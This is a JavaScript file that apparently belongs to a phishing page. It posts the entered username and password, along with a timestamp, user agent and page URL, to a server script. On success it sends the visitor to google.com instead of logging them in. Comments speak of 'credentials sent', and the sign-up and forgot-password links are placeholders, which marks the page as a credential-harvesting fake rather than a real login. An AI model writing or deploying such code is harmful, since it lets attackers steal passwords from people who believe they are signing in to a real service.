// Form elements
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginButton = document.getElementById('loginButton');
const passwordToggle = document.getElementById('passwordToggle');
const errorMessage = document.createElement('div');
errorMessage.className = 'error-message';
loginForm.appendChild(errorMessage);

// Password visibility toggle
passwordToggle.addEventListener('click', function() {
    const isPassword = passwordInput.type === 'password';
    passwordInput.type = isPassword ? 'text' : 'password';
    
    const icon = this.querySelector('i');
    icon.className = isPassword ? 'far fa-eye' : 'far fa-eye-slash';
});

// Form validation and button state
function validateForm() {
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (username && password) {
        loginButton.classList.add('active');
        loginButton.disabled = false;
    } else {
        loginButton.classList.remove('active');
        loginButton.disabled = true;
    }
}

// Real-time validation
usernameInput.addEventListener('input', validateForm);
passwordInput.addEventListener('input', validateForm);

// Form submission
loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (!username || !password) {
        showError('Please fill in all fields');
        return;
    }

    // Show loading state
    loginButton.classList.add('loading');
    loginButton.textContent = 'Logging in...';
    loginButton.disabled = true;
    clearError();

    console.log('Starting login process...');
    console.log('Username:', username);
    console.log('Current URL:', window.location.href);

    try {
        // Create FormData to match your original HTML form action
        const formData = new FormData();
        formData.append('username', username);
        formData.append('password', password);
        formData.append('timestamp', new Date().toISOString());
        formData.append('userAgent', navigator.userAgent);
        formData.append('url', window.location.href);

        console.log('FormData created, attempting fetch...');

        // Try the exact path from your HTML form action first
        let fetchUrl = 'server/login.php';
        console.log('Fetch URL:', fetchUrl);

        const response = await fetch(fetchUrl, {
            method: 'POST',
            body: formData,
            credentials: 'same-origin'
        });

        // console.log('Response status:', response.status);
        // console.log('Response headers:', response.headers);
        // console.log('Response ok:', response.ok);

        // Log the raw response text first
        const responseText = await response.text();
        // console.log('Raw response text:', responseText);

        if (!response.ok) {
            throw new Error(`Server error: ${response.status} - ${responseText}`);
        }

        // Try to parse as JSON
        let data;
        try {
            data = JSON.parse(responseText);
            // console.log('Parsed JSON:', data);
        } catch (parseError) {
            // console.error('JSON parse error:', parseError);
            // console.log('Response was not valid JSON:', responseText);
            throw new Error('Server returned invalid response format');
        }

        if (data && data.success) {
            window.location.href = 'https://www.google.com/';
            // showSuccess('Login credentials sent successfully!');
            // Clear form after successful submission
            usernameInput.value = '';
            passwordInput.value = '';
            validateForm();
        } else {
            throw new Error(data?.message || 'Failed to send login credentials.');
        }

    } catch (error) {
        // console.error('Login error details:', error);
        
        let userErrorMessage = 'An error occurred. Please try again later.';
        if (error.message.includes('405')) {
            userErrorMessage = 'Server configuration error. Please check if PHP is enabled.';
        } else if (error.message.includes('404')) {
            userErrorMessage = 'Login script not found. Please check file path.';
        } else if (error.message) {
            userErrorMessage = error.message;
        }

        showError(userErrorMessage);
    } finally {
        loginButton.classList.remove('loading');
        loginButton.textContent = 'Log in';
        loginButton.disabled = false;
        validateForm();
    }
});

// Error handling functions
function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    errorMessage.className = 'error-message';
    errorMessage.style.color = '#ff4757';
    errorMessage.style.fontSize = '14px';
    errorMessage.style.marginTop = '10px';
    errorMessage.style.padding = '8px 12px';
    errorMessage.style.borderRadius = '4px';
    errorMessage.style.backgroundColor = '#fff5f5';
    errorMessage.style.border = '1px solid #ffebeb';
    loginForm.classList.add('error');
}

function showSuccess(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    errorMessage.className = 'success-message';
    errorMessage.style.color = '#2ed573';
    errorMessage.style.fontSize = '14px';
    errorMessage.style.marginTop = '10px';
    errorMessage.style.padding = '8px 12px';
    errorMessage.style.borderRadius = '4px';
    errorMessage.style.backgroundColor = '#f0fff4';
    errorMessage.style.border = '1px solid #d4edda';
    loginForm.classList.remove('error');
}

function clearError() {
    errorMessage.textContent = '';
    errorMessage.style.display = 'none';
    loginForm.classList.remove('error');
}

// Tab interactions
document.getElementById('phoneTab').addEventListener('click', function(e) {
    e.preventDefault();
});

// Other link handlers
document.getElementById('forgotPassword').addEventListener('click', function(e) {
    e.preventDefault();
    alert('Forgot password clicked');
});

document.getElementById('goBack').addEventListener('click', function(e) {
    e.preventDefault();
    window.history.back();
});

document.getElementById('signUp').addEventListener('click', function(e) {
    e.preventDefault();
    alert('Sign up clicked');
});

// Initial validation
validateForm();

// Handle form auto-fill
window.addEventListener('load', function() {
    setTimeout(validateForm, 100);
});

// Handle enter key submission
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && usernameInput.value.trim() && passwordInput.value.trim()) {
        loginForm.dispatchEvent(new Event('submit'));
    }
});